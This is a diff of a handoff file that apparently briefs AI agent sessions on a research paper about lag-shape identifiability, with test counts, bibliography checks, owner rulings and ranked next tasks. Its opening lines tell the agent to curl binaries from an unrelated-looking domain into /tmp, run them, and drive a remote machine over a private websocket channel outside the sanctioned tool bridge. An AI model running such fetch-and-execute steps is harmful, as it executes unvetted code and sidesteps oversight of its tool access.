@@ -1,8 +1,8 @@
 ---
 project: wealth-tensor
-gh_sha: 161e71bf593f87a6b9cb11084f38a838a037d22d
+gh_sha: 42ca37732ca08ba6344cd7d10897d68d97376c66
 updated: 2026-08-12
-session: wealthTensor-16
+session: wealthTensor-17
 gate_passed: true
 gate_version: "2.50"
 ---
@@ -20,210 +20,207 @@ curl -s https://system.europeanflorist.com/dsh/darlish-up -o /tmp/darlish-up && 
 
 Post the printed `DARLISH-ENROLL v1 id=… fp=…` line **exactly** as a comment on Asana task
 `1217316841710435` via the session's Asana MCP, then run `/tmp/darlish-up` again to collect.
-**Re-run before diagnosing.** First collect has now worked `-06` through `-16` without exception;
-`-16` was READY in one cycle and the bridge rotated zero times all session.
+**Re-run before diagnosing.** First collect has now worked `-06` through `-17` without exception.
+**`-17` is the proof the pipe does not need the bridge:** the desktop MCP server disconnected
+mid-session, every `mcp__remote-devices__*` tool went away and came back thirteen minutes later, and
+`dx` did not notice, because darlish carries its own websocket. Do not restart anything.
 
 ```
 curl -s https://system.europeanflorist.com/dsh/dx -o /tmp/dx && chmod +x /tmp/dx
-/tmp/dx '~/Scripts/roster join --who big-wealthTensor-17 --task "<what you are doing>"'
-/tmp/dx '~/Scripts/roster claim --who big-wealthTensor-17 --resource wealth-tensor'
+/tmp/dx '~/Scripts/roster join --who big-wealthTensor-18 --task "<what you are doing>"'
+/tmp/dx '~/Scripts/roster claim --who big-wealthTensor-18 --resource wealth-tensor'
 ```
 
-`export LESSONS_CONTRIBUTOR=opus` **before any `lessons.py add`**.
+`export LESSONS_CONTRIBUTOR=opus` **before any `lessons.py add`**. Two leaves banked this session,
+one global and one project-scoped; both are in §2 below.
 
-**Never inline a multi-line commit message in a `dx '...'` argument.** `printf`/write to a local
-file, `--put` it, `git commit -F`. Used twice this session, no incidents.
-
-`dx --get` fails on binary — base64 both ways. Quote remote paths. Exit 3 = never reached darwin,
-safe to re-run; exit 4 = started, check state first. **Use `./.venv/bin/python` for everything** —
-`python3 -m pytest` dies at collection because scipy lives only in the venv. 199 tests, ~37s.
+**Never inline a multi-line commit message in a `dx '...'` argument.** Write a local file, `--put`
+it, `git commit -F`. Used twice this session, no incidents. **`dx --get` fails on binary** — base64
+both ways. Quote remote paths. Exit 3 = never reached darwin, safe to re-run; exit 4 = started,
+check state first. **Use `./.venv/bin/python` for everything** — `python3 -m pytest` dies at
+collection because scipy lives only in the venv. **271 tests, ~42 s** (was 199).
 
 **The roster contention warning naming YOU is still noise.** Carded on State Machine
 `1217420907841952`. Do not spend a turn on it.
 
-### The editing tool that makes this project cheap — and the trap it did NOT spring this time
+### The instrument took 22 minutes per run, and you can avoid paying that three times
 
-Anchor-counting Python patch scripts, never `sed`. Ten edit sites across two patches this session,
-**two anchor failures, both caught and both trivial** (a trailing `.` inside a bold span, and a
-whitespace-sensitive lambda). `dx --get` the manuscript to the container first and copy every anchor
-out of the real text rather than composing it from memory.
+`wt091` runs ~22 min on a loaded darwin: ladder W is 141 profile fits, ladder S is four more sweeps
+and ladder N is 600 joint fits. **`nohup … &` and poll `ps aux | grep -c "[w]t091"`** — python
+buffers stdout when redirected, so an empty log is not a hung run. `-17` paid for three full runs:
+one died on a bad severity check, one on a misleading print, one was the keeper. **Smoke-test every
+`check()` and every printed ratio against a stubbed `severity` module in the cloud container first**
+— numpy and scipy install there in seconds and a single mimic fit takes 1.8 s, which is enough to
+catch both.
 
-**`-15`'s structural-delimiter trap is now MECHANISED and you no longer have to remember it.**
-§4.9 is inserted before `## 5`, so its anchor necessarily runs through `---` and the `## 5` heading
-to be unique — the exact shape that silently absorbed §6 into §5 last session. `scripts/patchkit.py`
-now compares the document's skeleton before and after and **refuses the write**, having written
-nothing, if any heading or horizontal rule is gained or lost undeclared:
+### Editing the manuscript
 
-```python
-from patchkit import apply_edits
-apply_edits(edits, expect_structure={"###": +1})    # one subsection added, declared
-```
+`scripts/patchkit.py`, `apply_edits`, never `sed`, never a hand-rolled `src.count(old)` loop. **The
+structure guard earned its keep this session and cost nothing**: §4.10 is inserted before `---` and
+`## 5`, so its anchor necessarily runs through both — the exact shape that silently absorbed §6 into
+§5 in `-15` — and `expect_structure={"###": +1}` with both delimiters re-emitted in the replacement
+went through first time. Six anchors, zero failures, because every anchor was copied out of a
+`dx --get` copy of the real text and dry-run against it in the container before shipping.
 
-Undeclared changes raise `StructureError` naming the headings **LOST** and **GAINED**, because a
-checksum cannot tell you which section vanished. Eight tests in `tests/test_patchkit_structure.py`
-pin it, including the `-15` edit itself. **Use `apply_edits` rather than a hand-rolled
-`src.count(old)` loop** — this session hand-rolled and then had to write the guard anyway.
-15 `##` before and after this session; `###` went 27 → 28, the one section added.
+## 1 · WHAT HAPPENED — THE SHAPE IS IDENTIFIED, AND IT COSTS FOUR SIGNIFICANT FIGURES
 
-### Run any EDGAR crawl in the CLOUD, not on darwin
+`REG-005` registered and pushed (**6f0e7be**) before a line of the instrument existed;
+`scripts/wt091_lag_shape_identifiability.py` — **11 severe · 1 definitional · 0 vacuous**;
+**271 tests green (was 199)**; coach ratchet unchanged at **6**; concessive openers **0**; gate PASS.
 
-`data.sec.gov` and `www.sec.gov` are both reachable from the Cowork container; darwin's disk is at
-95%. But you almost certainly do not need to: `data/pre-002-events.json` (695 rows) and
-`data/pre-002-riskset.json` are **committed**, and `wt090` reads only those plus two fitted
-constants. **Check `.gitignore` before celebrating a committed artifact** — `data/` was ignored once
-and is now narrowed to `data/.universes/`.
+`-16` teed this here and REG-004 §5's stopping rule is why it was still available. §4.2 proves an
+impossibility by counting — four observable numbers against five parameters, the shortfall landing
+on φ — and that count assumed a constant hazard. §4.9 replaced the constant hazard with an arbitrary
+lag distribution, which is **not one more parameter but an infinite-dimensional object**, so the
+count had to be taken again.
 
-## 1 · WHAT HAPPENED — THE CLOSED FORM SURVIVES, AND IT SURVIVES AS A TRANSFORM
+> **The best constant-hazard world reproduces the measured world's reported series to 3.9 × 10⁻⁴ per
+> quarter at a ten-year life and 4.1 × 10⁻³ at a three-year one.** That number is the answer: it is
+> the precision a reported series must carry to reject the constant hazard at all.
 
-`REG-004` registered and pushed (**5160f51**) before a line of the instrument existed;
-`scripts/wt090_age_dependent_alpha.py` — **14 severe · 0 definitional · 0 vacuous**;
-**199 tests green (was 138)**; coach ratchet unchanged at **6**; concessive openers **0**; gate PASS.
+Everything else in §4.10 is that statement turned around. **At one part in ten thousand the reported
+series identifies the shape more tightly than §5.4's hand-collected event dates** — an interval of
+0.100 against 0.150. At one part in a thousand it is an order of magnitude worse, and the
+indistinguishable set reaches **k = 0.50**: a *decreasing* hazard, for which §4.9's tail condition
+gives **no steady-state deferral measure at any positive decay rate**. A series matched to a tenth of
+a per cent per quarter cannot separate the world in which this model is well-posed from one in which
+it has no steady state at all. That is the sharpest sentence in the section and it is sharper than
+any interval width.
 
-`-15` measured α and, in the same fit, rejected the shape: discrete Weibull k̂ = 1.210
-[1.135, 1.285]. **R = (1 − φ)δ/(α − δ) is derived by summing a geometric**, so §4.3's ranking,
-§4.4's crossing and §4.4's domain all inherited whatever that assumption was doing. It was doing one
-thing, and not the one the section leaned on.
+**Ladders I3 · P3 · W2 · S3 · N1, and TWO REGISTERED PREDICTIONS FAILED in the same direction.**
+I2 and W4 were predicted from Jorgenson's (1966) density result read with Sims's (1971) meagreness
+theorem and the classical ill-conditioning of exponential sums. The measured residue is four times
+larger than that reading allows and the interval is nine times the event-date interval rather than a
+hundred. Approximation theory describes what a family can do in the limit; this is one distribution
+over one horizon, and it leaves more behind. **Reported once, in §4.10's last paragraph, as a
+result.**
 
-> **R = (1 − φ)·( Π(1/(1 − δ)) − 1 )**,  Π(z) = **E**[z^T],  T ≥ 1 the recognition lag
+Two more worth carrying. **Ladder S is NOT monotone in the window** — 1.40 / 1.26 / **0.98** / 1.32
+at 20 / 40 / 80 / 400 quarters — because the shape lives in the transient and every quarter past the
+steady state repeats one number, which an average over t dilutes. The informative window is about
+twenty years and a century is worse than a decade. And **ladders W and N disagree on purpose**: W's
+interval is the deterministic identified set at a per-point tolerance, N's IQR of 0.125 is the
+sampling dispersion of a fitted estimator that averages forty observations. Both registered, both
+reported, and the tension between them is the interesting part rather than something to smooth.
 
-The gap is the flow convolved with the lag's survival function, and the sum telescopes into the
-lag's **generating function evaluated outside the unit disc** — a discrete moment generating
-function, not a Laplace transform, which is exactly why it can fail to exist. At a geometric lag
-Π(1/(1 − δ)) = α/(α − δ) and the published form returns verbatim, to **2 × 10⁻¹³**. An
-age-structured simulation carrying the gap as ageing cohorts, no closed form in the loop, matches to
-**2 × 10⁻¹³** against §4.3's published 2 × 10⁻⁴ transient bound, while **rejecting** the naive
-substitution α ← 1/**E**[T] at ten times that bound. R(φ)/R(0) = (1 − φ) to **exactly zero**.
+**Three recognition rates now live in the paper and they are three quantities.** α̂ = 0.408/yr (the
+event-date MLE), α_ser ≈ 0.438/yr (the series match, which is the reciprocal mean lag), and
+α_eff(δ) = 0.437 → 0.476 (the deferral match). They agree to **five parts in ten thousand** at a
+twenty-year life and are **15%** apart at a three-year one, moving in opposite directions from α̂.
+Least squares on the series matches the mean, the transform matches the tail, the likelihood matches
+the event dates.
 
-**What the constant hazard was holding up is the DOMAIN.** R is finite exactly when the lag's
-generating function has radius of convergence above 1/(1 − δ) — a condition on the **tail**, not the
-mean (Barlow, Marshall and Proschan, 1963, Thm 6.3, now cited). For a geometric that radius is
-1/(1 − α) and it reads α > δ, §4.4's domain verbatim. At k̂ = 1.21 it is entire and **the condition
-has no analogue**. Had the same fit returned k̂ < 1 there would be **no steady state at any positive
-decay rate at all** — so [1.135, 1.285] is doing more than rejecting a null, and there is now a test
-that says so by constructing the k = 0.75 case and watching it diverge.
+## 2 · TWO DEFECTS, BOTH FOUND BY LOOKING ONE PLACE FURTHER
 
-**Ladders, all registered before the run, all exhaustive: N1 · M1 / M3 · C2 · D1 · E2 · S2.** The
-shape correction is **0.67%** across §4.4's tabulated ladder and **43.9%** at a disclosed three-year
-life — negligible where this paper's ladder sits, material where the filings sit. α_eff runs 0.437
-to 0.476 per year across the disclosed rectangle, so it is **a function of δ and not a recalibrated
-constant**. The two-root exchange of §4.2 is **not** repaired by age-dependence: an age-dependent
-world sits 5 × 10⁻⁴ from its own constant-hazard match and exactly as far from that match's mirror —
-which is forced by §4.2's own theorem rather than discovered, and the write-up says so.
+**`α_eff` recomputed from REG-003's two fitted constants came back 6.4% high at every disclosed
+life** — 0.4646 against RESULT-REG-004 §5's published 0.4368 at forty years. RESULT-REG-004 fitted
+`α_eff` on both the as-fitted and the `T ≥ 1` conditioned lag distribution and **prints the
+conditioned one**; dropping the `T = 0` mass raises `E[T]` from 6.93 to 7.52 quarters. Ladder P's
+entire right-hand column was wrong until it was caught, and it was caught only because the number
+looked one per cent off a table that was sitting right there. **The series cannot see that
+conditioning at all** — REG-005's F4 proves it is a pure φ reparameterisation, to 4.8 × 10⁻¹⁶ — **and
+the level sees it at 6.4%.** Repair: `alpha_eff_annual` takes the conditioning explicitly, defaults
+to the published curve, prints **both** columns, and carries a severe check reproducing the five
+published values to `1e-4` with the as-fitted curve as its witness. Banked project-scoped:
+**a constant RECOMPUTED from its inputs is not the same object as the constant READ from the table
+that published it.**
 
-### And ladder C found the thing the registration was not watching for
+**REG-004's convergence guard was incomplete, and a test written to pin §4.9's divergence claim
+found it.** Refusing on a still-rising *term* cannot tell an exhausted tail from a **truncated** one:
+with a truncation shorter than it takes the term alone to pass `1e290`, the loop runs off the end of
+the array and returns a finite number for a divergent sum. **Same defect as `-16`'s underflowed tail,
+wearing "I ran out of array" instead of "the survival hit zero."** Repair: track the contribution and
+refuse when the last one is still the largest seen. Banked globally. **The pattern is now three for
+three — a test written to pin a claim, not to hunt a bug, is what finds these.**
 
-The **shape** moves the top-rung crossing by **0.13%**, 0.00755 → 0.00754. But §4.4's tabulated
-Kendall τ is **−0.67 at the measured recognition rate**, not −1, **and that is true before any shape
-correction is applied.** §4.4's own first-rung boundary δ₁ < αδ₀/(2α − δ₀) sits at 0.0214 at
-α = 0.05 and at **0.0156** at α̂ = 0.408; the table assigns δ₁ = 0.020. The section's closing
-sentence already said the measured rate is the one that applies while its table was still evaluated
-at the calibration, and those cannot both stand. Repaired in two places, minimally, without
-reopening the argument. **The general lesson is the one `-15` wrote down and this session collected
-on: a number that moves for a reason you cannot name is reporting a structural fact you have not
-found — and here the fact was one section downstream of where the search was pointed.**
+## 3 · JASON'S RULINGS — DO NOT REOPEN
 
-## 2 · WHAT THE TESTS CAUGHT THAT NO RUN COULD HAVE
-
-`Π` was summed with the term ratio evaluated as `S(a+1)/S(a)`. For a geometric past its own radius,
-and for **any** decreasing-hazard lag, the survival function **underflows to 0.0 while the term is
-still large**, and the loop read that as an exhausted tail and returned a **finite number for a
-divergent sum**. No ladder was affected — the fitted shape converges in a few dozen terms and never
-approaches underflow — but the defect would have fired on precisely the two cases the paper uses to
-say what the condition *excludes*. It was found by two tests written to pin §4.9's claims, not to
-hunt a bug: *the geometric transform diverges at 1.05 α*, and *a k < 1 fit would have had no steady
-state at all*. **A guard that certifies convergence must be able to tell an exhausted tail from an
-underflowed one.** Repair: carry the ratio in a closed form that cannot underflow, accumulate terms
-multiplicatively, and refuse rather than return once a still-rising partial term passes 1e290.
-Banked globally in `claude-blackbook`.
-
-**And the severity witness contract cost the first run.** `check()`'s witness must return a
-**falsy** value — the same *condition* re-evaluated in a false world, not the raw quantity. A
-witness returning `got - want` is truthy for any non-zero difference and the run dies as a phantom
-tag with the guard perfectly healthy. Keep the comparison inside the lambda. Banked project-scoped.
-
-## 3 · JASON'S RULINGS THIS SESSION — DO NOT REOPEN
-
-- **The `## References` provenance block STAYS AS IT IS.** Asked directly, ruled directly: it is the
-  one methods-disclosure paragraph charter §3.3 allows, generously read, and the confessional tone
-  is part of what makes the verification credible. `-15` left it rather than gutting it unilaterally
-  and was right to; it is now settled and needs no further sessions spent on it.
+- **The `## References` provenance block STAYS AS IT IS.** Ruled in `-16`, directly, on a direct
+  question. It is the one methods-disclosure paragraph charter §3.3 allows and the confessional tone
+  is part of what makes the verification credible. Settled; spend no session on it.
+- **§4.4's table is STILL AWAITING A RULING and `-17` did not decide it either.** See §5, item 2.
 
 ## 4 · THE PAPERS
 
-**Paper III** — `docs/papers/paper-III-dual-tensor/paper-III.md`, **2,433 lines** (was 2,249).
-Numbering preserved: 15 `##`, `###` 27 → 28.
+**Paper III** — `docs/papers/paper-III-dual-tensor/paper-III.md`, **2,600 lines** (was 2,433).
+Numbering preserved: 15 `##`, `###` 28 → 29.
 
 | § | what changed |
 |---|---|
-| **4.9 · NEW** | the general closed form, its three falsifiers, the tail condition, the magnitude table across disclosed lives, α_eff as a function, the crossing decomposition, and the exchange that survives |
-| 4.4 | τ marked at **both** rates in the table paragraph, and the first-rung boundary given at the measured rate. **Two sentences. The argument was not reopened and §4.4 was not polished.** |
-| 5.4 | now names whose discrete Weibull it fits — Nakagawa and Osaki (1975) — which it never did |
+| **4.10 · NEW** | the count retaken under an infinite-dimensional lag; the 3.9 × 10⁻⁴ crossover; the shape-interval table across four precisions; the sub-unit shapes and what they cost; the identified set against the estimator; the twenty-year window; three recognition rates; the mirror pair inside the best mimic; and the two failed predictions |
+| 4.9 | its closing sentence now names where the question is answered instead of leaving it open. **One clause. §4.9 was not reopened and was not polished.** |
 | 7 | **four rows added** |
-| 9 · L4 | the constant-hazard concession **narrowed rather than hedged**: it now states what the rejection costs and points at §4.9 |
-| abstract | the bare rejection of the constant hazard now carries its consequence |
+| references | **five entries** |
 
-**Bibliography, six entries added and one deliberately unmarked.** Barlow, Marshall and Proschan
-(1963) ✓ — Theorem 6.3 quoted in the form used, and equation (6.2) noted as the same result in the
-form a reader may find more familiar. Little (1961) ✓ — cited for what the stationary identity
-*requires*, a constant arrival rate, which this model never has. Nakagawa and Osaki (1975) ✓.
-Hayn and Hughes (2006) ✓ — the three-to-four-year lag and the ten-year tail, from the abstract.
-Potepa and Thomas (2023) ✓⧗ — the closest existing treatment of impairment *timing*, cited for
-being a covariate hazard with **no baseline shape**, which is the gap §5.4 occupies; working paper,
-end page omitted rather than guessed. **Marshall and Proschan (1972) carries NO mark on purpose** —
-the Berkeley Symposium volume was not consulted, the page range is omitted, and the entry says so.
-§4.9 does not depend on it, since the direction it predicts is also measured directly.
+**Bibliography.** Sims (1971) ✓ — Theorem 2 and the §5 conclusion quoted from an OCR'd scan, volume
+and pages confirmed against the journal's own table of contents. **It is the *Annals of Mathematical
+Statistics*, not *Econometrica*, and the title word is "explicitly", not "essentially" — the entry
+says so, because it is commonly miscited on both counts.** Jorgenson (1966) ✓ at abstract level, the
+approximation claim taken verbatim from the Econometric Society's record, body not read. Varah
+(1982) ✓ — **read in full**, the UBC technical report; it is the route by which Lanczos is cited at
+all, and a later journal version is believed to exist and was **not** verified, so the report is what
+is cited and what was read. Elbers and Ridder (1982) ✓ bibliographically, **text not consulted**, the
+characterisation taken from two independent secondary sources that state it identically and the entry
+saying exactly that. **Lanczos (1956) carries NO mark on purpose** — every located copy was
+lending-restricted, no full text was obtained, the page range is from NIST's documentation of the
+same example, and nothing in §4.10 rests on it except through Varah.
 
 ## 5 · THE AT-BAT, RANKED
 
-1. **IS THE LAG'S SHAPE IDENTIFIED FROM A REPORTED SERIES AT ALL?** This is `-16`'s tee-up and
-   REG-004 §5's stopping rule sent it here rather than letting it pull the session. §4.2 says a
-   reported series contains four numbers — two roots and two amplitudes — and the model has five
-   parameters. **An age-dependent lag has more than two.** The series carries the whole convolution,
-   so the question is not whether k is *another* parameter to lose but whether the extra structure
-   is visible at all: an age-dependent world sits 5 × 10⁻⁴ from its best constant-hazard *match at
-   α_eff*, and nobody has asked what the **best-fitting** constant hazard does, or whether k̂ is
-   recoverable from a noiseless series, or what noise level buries it. If k is *not* identified, the
-   §4.2 impossibility result gets materially stronger and §4.9's correction becomes something a
-   reader can never apply from filings — which is a limitation worth stating precisely. If it *is*,
-   there is a second observable in the series nobody has used. **Pure theory, no data. Register
-   before deriving anything that could be reported as a result.**
-2. **SEPARATE THE ECONOMIC COUPLING FROM ASC 360's SEQUENCING.** §5.4 establishes departure from
-   diagonality at 2–4× and explicitly cannot say why: the recoverability screen is ordered before
-   the goodwill test, so one trigger makes two charges by the standards rather than by the assets.
-   The discriminator is the **triggering disclosure**, not the charge. New data, new registration,
-   and it is the natural sequel to the only result Limitation 9 ever asked for. Unchanged from `-15`.
-3. **PROPAGATE α̂ THROUGH §4.4's TABLE PROPERLY, OR RULE THAT THE TABLE IS DELIBERATELY AT THE
-   CALIBRATION.** `-16` marked the τ in two places and stopped there, because §4.4 is under a
-   standing no-polish order and the fix is a *taste* call about what the table is for. The table's
-   R column is computed at α = 0.05 throughout; at α̂ = 0.408 the four values are 0.0159, 0.0206,
-   0.0151, 0.0039. Either the table gains a second column and the prose stays, or the table is
-   explicitly labelled as the calibration case. **Ask Jason. Do not decide it alone and do not
-   rewrite the section around it.**
-4. **THE σ-AND-LIFETIME RESULT still needs new data** — realised return volatility and disclosed
-   useful lives are not in this sample, Companion C's severity dispersion by class has overlapping
-   intervals, and proxying is the WT-038 error, a three-time payer. Unchanged from `-15`.
+1. **SEPARATE THE ECONOMIC COUPLING FROM ASC 360's SEQUENCING.** §5.4 establishes departure from
+   diagonality at 2–4× and explicitly cannot say why: the recoverability screen is ordered before the
+   goodwill test, so one trigger makes two charges by the standards rather than by the assets. The
+   discriminator is the **triggering disclosure**, not the charge. New data, new registration, and it
+   is the natural sequel to the only result Limitation 9 ever asked for. Unchanged from `-15`, `-16`,
+   and now the top of the list because the identification question is closed.
+2. **ASK JASON ABOUT §4.4's TABLE. `-16` did not decide it and `-17` did not either.** §4.4 is under
+   a standing no-polish order and the rest is a taste call. The table's R column is computed at
+   α = 0.05 throughout; at α̂ = 0.408 the four values are 0.0159, 0.0206, 0.0151, 0.0039. Either the
+   table gains a second column and the prose stays, or the table is explicitly labelled as the
+   calibration case. **Do not decide it alone and do not rewrite the section around it.**
+3. **SWEEP THE REPO FOR OTHER RECOMPUTED CONSTANTS.** §2's first defect is almost certainly not
+   unique: any script that takes REG-003's `k̂` and `q̂` and derives a quantity a RESULT file already
+   publishes can silently get a different curve, and the difference is invisible until something
+   compares them. `wt091` now carries the pattern — reproduce the published values to `1e-4`, with
+   the wrong variant as the witness. **A pass over `wt082`–`wt090` asking "which constants here are
+   recomputed rather than read, and does anything check them against the table that published
+   them?"** is cheap, mechanical and exactly the kind of thing that pays a session later. Register
+   nothing; this is a guard audit, not a result.
+4. **THE σ-AND-LIFETIME RESULT STILL NEEDS NEW DATA.** Realised return volatility and disclosed
+   useful lives are not in this sample; Companion C's severity dispersion by class has overlapping
+   intervals. **Do not proxy** — a quantity that shares σ's name and not its meaning is the WT-038
+   error, a three-time payer.
 
 ## 6 · DO NOT
 
 - Do not read §5.4 as a rescue of PRE-001. REG-003 §7 ruled it out in writing before the number
-  existed. Nothing in REG-004 touches it.
+  existed. Nothing in REG-004 or REG-005 touches it.
 - Do not restore "PRE-001 was doomed by the φδ confound" — false; wt082, wt083, wt088 E7.
-- Do not remove the Bateman, Nerlove or Beaver & Ryan concessions. Do not restore "global rather
-  than local" to Kuan, the unordered-pair statement to Bellman & Åström, or the bias/lag DESIGN to
-  Ryan (1995).
+- Do not remove the Bateman, Nerlove or Beaver & Ryan concessions. Do not restore "global rather than
+  local" to Kuan, the unordered-pair statement to Bellman & Åström, or the bias/lag DESIGN to Ryan
+  (1995).
 - Do not reopen Griliches (1967). Closed with evidence.
-- Do not reopen the `## References` provenance block. **Ruled this session — §3 above.**
-- **DO NOT POLISH §4.4, §5.4 OR §4.9.** §4.4 has now been rewritten whole twice and had three
-  numbers changed. §4.9 is a day old and reports registered results.
-- Do not quote a single "effective recognition rate". α_eff is a function of δ; any comparative
-  static that holds it fixed while moving δ is using the wrong derivative, and §4.9 says so.
+- Do not reopen the `## References` provenance block. Ruled in `-16` — §3 above.
+- **DO NOT POLISH §4.4, §5.4, §4.9 OR §4.10.** §4.4 has been rewritten whole twice and had three
+  numbers changed. §4.9 and §4.10 report registered results and §4.10 is a day old.
+- Do not quote a single "effective recognition rate" — α_eff is a function of δ. **And do not quote a
+  single "recognition rate" either**: §4.10 shows the name covers three quantities that are 15% apart
+  at a three-year life.
 - Do not report "the share of the disclosed rectangle inside the model's domain" as a finding of
-  REG-004. Under an entire generating function the complement is empty and the share is 100% by
-  construction. REG-004 §3 struck it deliberately; it is not an oversight to be corrected.
+  REG-004. The complement is empty and the share is 100% by construction. Struck deliberately.
+- **Do not report a share over the δ-rectangle from REG-005 either.** REG-005 §3 registered the guard
+  in advance and the instrument withheld it: the "visible" set is empty at the 10⁻² threshold, so its
+  share is 0% by construction — the same statistic arriving from the other side.
+- **Do not read §4.10 as licence to drop §4.9's correction.** A correction that needs four
+  significant figures is still the right correction for anyone holding the lag distribution, and
+  §5.4 holds it.
+- **Do not read §4.10's positive result as transferring to a firm-level series.** REG-005 §1
+  registered the normalisation as the generous one; the identification measured is for an asset
+  followed from acquisition, and §4.2's free-φ result is untouched.
 - Do not hand Jason a ranked list of problems as the deliverable. Do not run a pure-teardown pass.
 - Do not invoke Mayo or error-statistical philosophy as a warrant. Pragmatic justification.
 - Do not ask Jason to submit anything. Never add a free parameter to absorb an objection.
 - Do not rewrite or summarise the charter inside a handoff.
 - Adding a section means DELETING conduct narration elsewhere, not refreshing `.coach-baseline.json`.
-  `-16` added §4.9 (~100 lines), four ledger rows and six bibliography entries and stayed at **6**,
+  `-17` added §4.10 (~110 lines), four ledger rows and five bibliography entries and stayed at **6**,
   because none of it narrates conduct. That is the mechanism working, not a loophole.
